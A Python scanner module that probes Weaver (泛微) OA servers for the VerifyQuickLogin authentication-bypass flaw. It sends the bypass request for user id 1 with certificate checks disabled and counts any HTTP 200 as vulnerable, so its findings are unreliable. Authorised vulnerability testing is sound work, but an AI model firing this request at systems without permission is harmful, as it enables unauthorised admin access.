import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import urllib3


urllib3.disable_warnings()

def 泛微OA_Verify_QuickLogin(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,imge/avif,imge/webp,imge/apng,*/*;q=0.8,application/signed-exchange;v=63;q=0.9",
        "Accept-Encoding": "gzip,deflate",
    }
    data = 'identifier=1&language=1&ipaddress=x.x.x.x'
    vuln_url = urldata + "mobile/plugin/VerifyQuickLogin.jsp"
    try:
        requests.packages.urllib3.disable_warnings()
        url = requests.post(vuln_url, headers=headers, data=data, verify=False)
        if url.status_code == 200:
            print(Vcolors.RED +"[!] 检测到存在泛微OA_Verify_QuickLogin\r" + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 不存在泛微OA_Verify_QuickLogin漏洞" + Vcolors.ENDC)
    except Exception as e:
        logging.error("泛微OA_Verify_QuickLogin脚本出现异常")
  
        


